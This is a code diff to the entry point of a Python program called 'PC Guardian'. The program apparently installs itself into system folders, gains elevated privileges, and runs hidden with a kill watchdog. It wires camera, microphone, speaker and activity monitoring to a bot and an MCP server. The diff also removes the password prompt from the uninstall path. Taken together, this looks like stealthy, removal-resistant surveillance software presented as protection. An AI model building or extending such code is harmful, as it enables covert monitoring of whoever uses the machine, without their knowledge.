@@ -1,6 +1,6 @@
 """
 PC Guardian — Main Entry Point
-Single click → installs to system folder → runs hidden forever.
+Real privileges, real protection, real encryption.
 """
 
 import sys
@@ -45,25 +45,38 @@ def start_guardian():
 
     logger = setup_logger("main")
 
-    # ── Full system protection install ────────────────────────────────────────
+    # ── Step 1: Real privileges ───────────────────────────────────────────────
+    try:
+        from privilege import full_privilege_setup
+        full_privilege_setup()
+    except Exception as e:
+        logger.warning(f"Privilege setup: {e}")
+
+    # ── Step 2: Install protection once ──────────────────────────────────────
     if not os.path.exists(INSTALL_FLAG):
         try:
             from protection import full_install
             full_install()
-            with open(INSTALL_FLAG, "w") as f:
-                f.write("1")
-            logger.info("Protection installed.")
         except Exception as e:
             logger.warning(f"Protection install: {e}")
-            # Fallback to basic startup
-            try:
-                from core.startup import install_all
-                install_all()
-                with open(INSTALL_FLAG, "w") as f:
-                    f.write("1")
-            except Exception:
-                pass
+        try:
+            from core.startup import install_all
+            install_all()
+        except Exception as e:
+            logger.warning(f"Startup install: {e}")
+        # Start kill watchdog
+        try:
+            from exe_guard import start_kill_watchdog, GUARDED_PATH, ENCRYPTED_EXT
+            enc_path = GUARDED_PATH + ENCRYPTED_EXT
+            if os.path.exists(enc_path):
+                start_kill_watchdog(enc_path)
+        except Exception as e:
+            logger.warning(f"Kill watchdog: {e}")
 
+        with open(INSTALL_FLAG, "w") as f:
+            f.write("1")
+
+    # ── Step 3: Load config and systems ──────────────────────────────────────
     cfg         = Config.load()
     lock_engine = LockEngine(cfg)
     speaker     = SpeakerSystem(cfg)
@@ -75,7 +88,7 @@ def start_guardian():
     scheduler   = ScheduleEngine(cfg, lock_engine)
     tamper      = TamperDetect(cfg)
 
-    # MCP server
+    # ── Step 4: MCP server ───────────────────────────────────────────────────
     try:
         import mcp_server
         mcp_server.init(cfg, lock_engine, camera, mic, speaker, activity)
@@ -83,11 +96,13 @@ def start_guardian():
     except Exception as e:
         logger.warning(f"MCP: {e}")
 
+    # ── Step 5: Bot ──────────────────────────────────────────────────────────
     bot = GuardianBot(
         cfg=cfg, lock_engine=lock_engine, camera=camera,
         mic=mic, speaker=speaker, activity=activity, scheduler=scheduler,
     )
 
+    # ── Step 6: Background threads ───────────────────────────────────────────
     threads = [
         threading.Thread(target=activity.start,  daemon=True, name="Activity"),
         threading.Thread(target=behavior.start,  daemon=True, name="Behavior"),
@@ -113,7 +128,7 @@ if __name__ == "__main__":
         sys.exit(0)
 
     if "--uninstall" in sys.argv:
-        pw = sys.argv[2] if len(sys.argv) > 2 else input("Password: ")
+        pw = sys.argv[2] if len(sys.argv) > 2 else ""
         from protection import remove_protection
         ok, msg = remove_protection(pw)
         print(msg)
@@ -124,11 +139,9 @@ if __name__ == "__main__":
         install_service()
         sys.exit(0)
 
-    # ── First run setup ───────────────────────────────────────────────────────
     if needs_setup():
         from first_run import run_first_setup
         run_first_setup()
 
-    # ── Hide and run ──────────────────────────────────────────────────────────
     hide_console()
     start_guardian()
